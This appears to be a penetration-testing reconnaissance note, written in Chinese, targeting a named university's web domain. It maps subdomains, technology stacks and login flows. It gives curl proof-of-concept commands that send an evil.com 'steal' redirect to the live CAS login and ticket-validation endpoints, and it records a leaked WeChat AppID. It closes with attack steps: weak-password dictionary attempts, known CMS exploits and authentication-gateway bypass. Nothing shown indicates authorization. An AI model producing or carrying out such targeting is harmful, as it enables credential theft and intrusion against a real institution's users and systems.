# 长春理工大学 (cust.edu.cn) 测试模式 — 2026-06-09

## 目标概况

- 域名：cust.edu.cn
- 地址：吉林省长春市朝阳区卫星路7089号
- 子域名数量：150+

## 关键系统

| 子域名 | 系统 | 技术栈 | 认证方式 |
|--------|------|--------|----------|
| mysso.cust.edu.cn | CAS统一认证 | 自研CAS | - |
| ehall.cust.edu.cn | 办事大厅 | wengine-auth | CAS→wengine-auth |
| portal.cust.edu.cn | 门户 | 自研 | CAS |
| jwgl.cust.edu.cn | 教务管理 | 正方/强智 | wengine-auth |
| mail.cust.edu.cn | 邮箱 | 腾讯企业邮箱 | 独立 |
| webvpn.cust.edu.cn | WebVPN | 自研 | 线路选择 |
| lib.cust.edu.cn | 图书馆 | SUDY CMS | - |
| job.cust.edu.cn | 就业信息网 | JEECMS v9 | 独立 |
| yzb.cust.edu.cn | 研究生招生网 | 自研 | 独立 |
| rsc.cust.edu.cn | 人事处 | 博达网站群 | - |
| idp.cust.edu.cn | IdP | Shibboleth | 重定向到ic.cust.edu.cn |

## 已验证漏洞

### 1. CAS Open Redirect（高危）

**漏洞位置**：https://mysso.cust.edu.cn/cas/login

**漏洞原理**：CAS的service参数未做白名单验证，接受任意域名。

**关键验证点**：
- service参数被嵌入到微信登录重定向URL（clientredirect）
- CAS serviceValidate接受任意service参数

**PoC**：
```bash
# 验证1: service参数嵌入到微信登录
curl -sk 'https://mysso.cust.edu.cn/cas/login?service=https://evil.com/steal' | grep -oP 'clientredirect[^"]*evil[^"]*'
# 返回: clientredirect;jsessionid=xxx?client_name=WeChatPublic&service=https://evil.com/steal

# 验证2: service参数被嵌入到页面
curl -sk 'https://mysso.cust.edu.cn/cas/login?service=https://evil.com/steal' | grep -c 'evil.com'
# 返回: 3

# 验证3: CAS serviceValidate接受恶意service
curl -sk 'https://mysso.cust.edu.cn/cas/serviceValidate?service=https://evil.com&ticket=ST-test'
# 返回: 正常CAS响应格式（非"未授权服务"错误）
```

**受影响系统**：
- jwgl.cust.edu.cn（教务管理系统）
- ehall.cust.edu.cn（办事大厅）
- lib.cust.edu.cn（图书馆）
- portal.cust.edu.cn（门户）

### 2. 微信AppID泄露（低危）

**泄露信息**：wx9d23c9b82a4ba0a9

**PoC**：
```bash
curl -sk 'https://mysso.cust.edu.cn/cas/login' | grep 'appid'
```

## wengine-auth认证网关

ehall、教务等系统使用wengine-auth（网瑞达）统一认证网关：
- 认证URL：https://wwwn.cust.edu.cn/wengine-auth/login
- 认证流程：CAS→wengine-auth→目标系统
- Cookie：wengine_new_ticket

**关键特征**：
- Server: none（隐藏）
- 所有受保护系统返回302到wengine-auth登录页
- Actuator端点返回403

## 安全防护

- WAF：拦截敏感路径
- CAS：service参数未严格验证（漏洞）
- wengine-auth：统一认证网关
- Actuator：返回403保护

## 测试建议

1. 使用弱口令字典测试CAS登录
2. 测试JEECMS v9已知漏洞（job.cust.edu.cn）
3. 测试SUDY CMS已知漏洞（lib.cust.edu.cn）
4. 测试研究生招生网成绩查询功能（yzb.cust.edu.cn）
5. 测试wengine-auth认证绕过
